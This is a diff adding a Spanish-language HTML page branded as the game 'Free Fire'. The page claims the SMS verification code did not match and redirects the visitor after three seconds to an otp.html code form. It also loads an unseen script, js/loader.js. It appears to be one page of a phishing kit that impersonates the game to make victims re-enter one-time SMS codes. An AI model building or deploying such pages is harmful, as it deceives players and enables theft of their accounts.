@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Error código SMS | Free Fire</title>
+
+    <!-- Font Awesome Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+
+    <style>
+        :root {
+            --color-primary: #E41E26;
+            --color-bg: #0a0a0a;
+        }
+
+        * {
+            box-sizing: border-box
+        }
+
+        body {
+            margin: 0;
+            height: 100vh;
+            font-family: system-ui, -apple-system, "Segoe UI", sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
+            color: #ffffff
+        }
+
+        .error-panel {
+            width: 100%;
+            max-width: 380px;
+            background: #1e1e1e;
+            border-radius: 12px;
+            box-shadow: 0 10px 40px rgba(228, 30, 38, 0.3), 0 2px 8px rgba(0, 0, 0, 0.5);
+            padding: 22px 20px 18px;
+            text-align: center;
+            border-top: 4px solid var(--color-primary);
+        }
+
+        .error-icon {
+            width: 64px;
+            height: 64px;
+            border-radius: 50%;
+            background: rgba(255, 152, 0, 0.1);
+            border: 3px solid #ff9800;
+            color: #ff9800;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 32px;
+            margin: 0 auto 16px;
+            animation: shake 0.5s ease-in-out;
+        }
+
+        @keyframes shake {
+
+            0%,
+            100% {
+                transform: translateX(0);
+            }
+
+            25% {
+                transform: translateX(-10px);
+            }
+
+            75% {
+                transform: translateX(10px);
+            }
+        }
+
+        .error-title {
+            font-size: 1.1rem;
+            font-weight: 700;
+            margin: 4px 0 10px;
+            color: #ffffff;
+        }
+
+        .error-text {
+            font-size: 0.9rem;
+            color: #cccccc;
+            margin: 2px 0 14px;
+            line-height: 1.5;
+        }
+
+        .error-secondary {
+            font-size: 0.8rem;
+            color: #999;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+        }
+
+        .error-secondary i {
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+    </style>
+    <meta http-equiv="refresh" content="3; url=otp.html">
+</head>
+
+<body>
+    <div class="error-panel">
+        <div class="error-icon">
+            <i class="fas fa-sms"></i>
+        </div>
+        <p class="error-title">Error en el código SMS</p>
+        <p class="error-text">El código de verificación no coincide. Vuelve a ingresarlo.</p>
+        <p class="error-secondary">
+            <i class="fas fa-sync-alt"></i>
+            Serás redirigido al formulario de código en unos segundos…
+        </p>
+    </div>
+
+    <script src="js/loader.js"></script>
+
+</body>
+
+</html>
